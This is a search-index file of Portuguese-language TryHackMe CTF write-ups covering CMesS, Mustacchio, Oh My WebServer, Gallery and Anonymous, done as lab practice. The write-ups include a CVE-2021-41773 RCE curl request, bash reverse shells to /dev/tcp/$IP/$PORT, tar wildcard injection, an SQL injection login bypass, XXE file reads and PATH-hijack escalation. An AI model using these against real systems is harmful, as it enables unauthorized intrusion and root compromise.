[ { "title": "THM - CMesS", "url": "/posts/thm-cmess/", "categories": "tryhackme, writeup", "tags": "tryhackme, writeup", "date": "2022-05-22 01:00:00 -0300", "snippet": "ReconVamos começar com o recon da máquina usando o Nmap# Nmap 7.80 scan initiated Sun May 22 01:07:06 2022 as: nmap -sC -sV -oA nmap -v cmess.thmNmap scan report for cmess.thm (10.10.255.204)Host is up (0.26s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)| 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)|_ 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-generator: Gila CMS| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 3 disallowed entries |_/src/ /themes/ /lib/|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun May 22 01:08:00 2022 -- 1 IP address (1 host up) scanned in 54.24 seconds -sC - Default Nmap scripts -sV - Services version -oA - Save output to a file -v - Verbose modeA princípio há apenas dois serviços rodando na máquina: Apache executando um Gila CMS na porta 80 e um SSH na 22.UserApós fazer um fuzzing nos diretórios encontrei uma página de login, porém ainda sem nenhuma credencial. Então fiz um scan de subdomínios no host usando o FFuf.As primerias saídas são falsos positivos, pois todas retornam código 200, então precisamos filtrar a partir de outro tipo de dado, e neste caso irei usar a opção -fw 522.Assim consegui encontrar o subdomínio dev.Acessando a página, há uma credencial vazada, então podemos testá-la na página de login previamente encontrada.Com essas credenciais conseguimos acesso a uma página administrativa, onde contém algumas funcionalidades que podemos explorar.Após analisar a página e verificar as funcionalidades disponíveis, encontrei uma feature que me permite alterar os temas da páginaAs permissões atuais me permitem alterar o código fonte da página, então podemos inserir código em php para ser carregado na página e me enviar uma conexão. Para isso usei a reverse shell do pentestmonkey. Você pode encontrá-la aquiApós salvar as alterações, abri uma porta no netcat para esperar a conexão reversa.Conseguindo a conexão, analisei a máquina manualmente, e já na verificação dos diretórios encontrei um arquivo de backup contendo uma senha do usuário AndreLogando na conta, conseguimos a primeira flag.RootPara conseguir root na máquina, também não foi necessário usar ferramentas, pois na própria home continha a informação de que havia um backup sendo feitoPresumi então que o backup estava sendo feito via cron, então analisando os arquivos do crontab percebi que poderia explorar a vulnerabilidade de wildcard injectionPara isso precisamos criar três arquivos no diretório que está sendo salvo--checkpoint=1--checkpoint-action=exec=sh shell.shshell.shO cron irá interpretar estes arquivos como parâmetros do comando e irá executar como rootAgora precisamos apenas abrir uma porta usando o netcat e aguardar o cron executar nosso comando, nos dando uma sessão root. Assim completamos o desafio :)" }, { "title": "THM - Mustacchio", "url": "/posts/thm-mustacchio/", "categories": "tryhackme, writeup", "tags": "tryhackme, writeup", "date": "2022-03-30 16:50:00 -0300", "snippet": "ReconVamos começar com o scangui@gui:~$ nmap -sC -sV -oA nmap -p- -v 10.10.253.75Nmap scan report for 10.10.253.75Host is up (0.24s latency).Not shown: 65532 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)| 256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)|_ 256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: POST OPTIONS GET HEAD| http-robots.txt: 1 disallowed entry |_/|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Mustacchio | Home8765/tcp open http nginx 1.10.3 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST|_http-server-header: nginx/1.10.3 (Ubuntu)|_http-title: Mustacchio | LoginService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel -sC - Default Nmap scripts -sV - Services version -oA - Save output to a file -p- - All 65535 ports -v - Verbose modeEncontrei três serviços rodando. Apache, Nginx e SSH, então vamos começar pela aplicação webUserAnalisando a página inicial não foi encontrado nada de muito interessante, porém olhando o código fonte da página vi que um script estava sendo executado, a partir do diretório customAcessando esse diretório encontrei o arquivo users.bak. Bainxando o mesmo nós podemos analisar melhor.Ok, encontramos duas informações: usuário admin e a hash da senha, então podemos usar o crackstation para quebrá-la Usuário: admin Senha: bulldog19Agora consigo tentar usar essas credenciais no serviço que está rodando na porta 8765.Acessando o código fonte da página encontrei um comentário deixado por um usuário, nos informando que o user Barry pode acessar o SSH usando uma chave. Há também outro arquivo .bak que podemos baixar no diretório auth.O arquivo trata-se de um XML, então podemos tentar explorar uma falha de XXE na aplicação.A princípio testei apenas um XML para ver o comportamento do site.Então usando um payload de XXE nós conseguimos acessar o arquivo /etc/passwdAgora podemos roubar a chave SSH privada do usuário Barry. Para isso vamos usar a falha de Local File Inclusion para ler o arquivo.Infelizmente não conseguimos acessar a conta apenas com a chave, precisamos da senha do id_rsa.Então podemos usar o John The Ripper para fazer um bruteforce.E assim conseguimos quebrar a senha: urieljamesAgora sim podemos fazer acesso usando o SSH com a chave e senha conseguidos.RootAo iniciar a escalação de privilégios, notei que há dois usuários e dois diretórios home.No diretório do usuário Joe tem um arquivo, e usando novamente o file e strings conseguimos ver o tail sendo chamado.Para fazer a exploração basta criar um arquivo chamado tail que execute o bash e alterar a variável de ambiente PATH.Pronto, agora temos acesso root ao sistema e conseguimos a última flag." }, { "title": "THM - Oh My WebServer", "url": "/posts/thm-ohmywebserver/", "categories": "tryhackme, writeup", "tags": "tryhackme, writeup", "date": "2022-03-24 01:00:00 -0300", "snippet": "ReconComeçando com Nmap, vamos enumerar a máquina para ver quais portas e serviços estão rodando no servidor. -sC - Default Nmap scripts -sV - Services version -oA - Save output to a file -v - Verbose modeApenas as portas 80 e 22 estão abertas, executando um Apache 2.4.4 e um SSH respectivamente. Então vamos começar pela aplicação web.A princípio não há nada demais, então podemos enumerar os diretórios usando o ffufffuf -u http://10.10.148.87/FUZZ -w /path/to/wordlist -t 90 -c -u - Target URL -w - Wordlist file path -t - Number of concurrent threads -c - Colorize outputEncontrei dois diretório que podem ser interessantes: assets e cgi-binPorém a princípio não havia nada de maisReverse shellApós não encontrar muita coisa, voltei nos resultados do Nmap e notei que a versão do Apache que estava sendo executada havia uma CVE: CVE-2021-41773. Podemos confirmar usando o cURL.curl &#39;http://10.10.148.87/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash&#39; -d &#39;Content-Type: text/plain; echo; whoami &amp;amp;&amp;amp; id&#39;Consegui um Path Traversal, no qual conseguimos executar comandos, então podemos usar o cURL e o netcat para estabelecer uma conexão reversa.curl &#39;http://10.10.148.87/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash&#39; -d &quot;Content-Type: text/plain; echo; bash -c &#39;exec bash -i &amp;amp;&amp;gt;/dev/tcp/$IP/$PORT/ &amp;lt;&amp;amp;1&#39;&quot;UserRecebi a conexão, porém não tem nenhum usuário no sistema e também nenhum diretório home.Após passar algum tempo procurando um ponto de partida decidi usar o linPEAS, e foi onde obtive a seguinte saída:Com isso podemos setar o UID usando o python.python3 -c &#39;import so; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;RootApós a enumeração olhei novamente a saída do linPEAS, e foi onde econtrei algo interessante: há outro endereço IP. Então podemos usar o Nmap para enumerar esse host. Você pode baixar o binário aqui.nmap -v 172.17.0.0-5Esse comando vai fazer um scan do host 0 ao 5, e saída nos mostra que o host 172.17.0.1 está ativo.Enumerando todas as 65535 portas o scan apontou duas portas abertas: 5985 e 5986Com isso temos outra CVE: CVE-2021-38647, na qual podemos usar um script já pronto para explorar a falha. Você pode baixar o script aqui.O scrip executa comandos na máquina alvo, então podemos passá-los na execução como argumento, lendo a flag de root." }, { "title": "THM - Gallery", "url": "/posts/thm-gallery/", "categories": "tryhackme, writeup", "tags": "tryhackme, writeup", "date": "2022-03-24 01:00:00 -0300", "snippet": "Primeiramente, vamos usar o Nmap para encontrar portas e serviços abertos no sistema.Como podemos ver há duas portas abertas no sistema que estão executando Apache: 80 e 8080, então acessando podemos ver que a porta 80 tem apenas a página padrão do Apache, enquanto a porta 8080 está rodando o CMS Simple Image Gallery System.Ao invés de procurar por algum exploit pronto, podemos tentar explorar o sistema por conta próprio. Apenas tentando um payload básico de injeção SQL podemos acessar a conta de Admin.&#39; or 1=1 -- - Agora podemos procurar alguma maneira de conseguir uma shell, e como podemos ver temos a permissão para fazer upload de arquivos para o servidor. A primeira coisa que podemos tentar é subir uma shell em PHP para recebermos pelo Netcat. Usei a shell do PentestMonkeyPronto, conseguimos uma conexão reversa, porém estamos logados como www-data então precisamos elevar os privilégios, e para isso chequei o código fonte da aplicação, onde encontrei as credenciais do banco de dados.Agora que temos a senha podemos acessar o banco.Acessando o banco conseguimos a senha de Admin para responder à terceira questão.Porém se tentarmos ler a flag de usuário veremos que não temos permissões o suficientePrecisaremos então escalar nosssos privilégios, e após analisar a máquina encontrei um diretório de backupO diretório contém o arquivo .bash_history, onde contém o histórico de comandos executados pelo usuário, e junto a isso a senha usada pelo mesmo.Pronto, conseguimos a flag de usuário, agora vamos atrás da conta root.A primeira coisa que costumo fazer para a escalação de privilégios é checar quais comandos consigo executar comoLendo o código fonte deste script podemos ver que temos a permissão de executar o Nano com privilégios root.Usando o GTFObins encontrei a forma pela qual iremos fazer a escalação.Porém para isso precisamos estabilizar nossa shell. Para isso basta colocar a shell em background usando CTRL+Z e depois digitarstty raw -echo; fgAgora basta executar o script como root, escolher a opção do Nano e digitar os comandos.Pronto, encontramos a flag de root." }, { "title": "THM - Anonymous", "url": "/posts/thm-anonymous/", "categories": "tryhackme, writeup", "tags": "tryhackme, writeup", "date": "2022-03-24 01:00:00 -0300", "snippet": "Questões Enumerate the machine. How many ports are open? What service is running on port 21? What service is running on ports 139 and 445? There’s a share on the user’s computer. What’s it called?Temos quatro questões antes de pegar as flags de User e Root, então vamos começar enumerando a máquina para responder a primeira.Anonymous roomEnumerationComeçando com o scan padrão do Nmap (que eu uso geralmente) nmap -sC -sV -oA nmap -v $IP. sC - Default nmap scripts sV - Open ports services/version oA - Save output to ‘nmap’ file v - Verbose modeIsso já foi o suficiente para responder as três primeiras questões.Para a quarta questão precisaremos executar outro scan com o Nmap, e como podemos ver há um Samba sendo executado no sistema então precisaremos enumerá-lo. nmap --script smb-enum-shares.nse -p 445,139 -v -oA smb $IPPronto, além da quarta questão respondida podemos acessar esse samba.smbclient \\\\\\\\$IP\\\\picsNada de interessante aqui, porém o servidor FTP está acessível para login anônimoE aqui temos 3 arquivos: clean.sh removed_files.log to_do.txtOlhando o arquivo de log, presumo que o script clean.sh está sendo executado a cada X minutos, então podemos ler o código fonte para ver o que está acontecendo.Tendo a permissão de escrita no arquivo podemos enviar uma linha de código que irá executar o bash, que nos enviará uma conexão bash -c &#39;exec bash -i &amp;amp;&amp;gt;/dev/tcp/$IP/$PORT &amp;lt;&amp;amp;1&#39;Agora precisamos enviar a saída para dentro do arquivo clean.sh usando o appendUsando o netcat preciso apenas esperar a conexão ser estabelecida.Flag de usuário encontrada, então vamos para a escalação de privilégios. Para fazer isso usei o linPEAS e na saída vi que posso preciso apenas executar um comando. /usr/bin/env /bin/sh -p" } ]
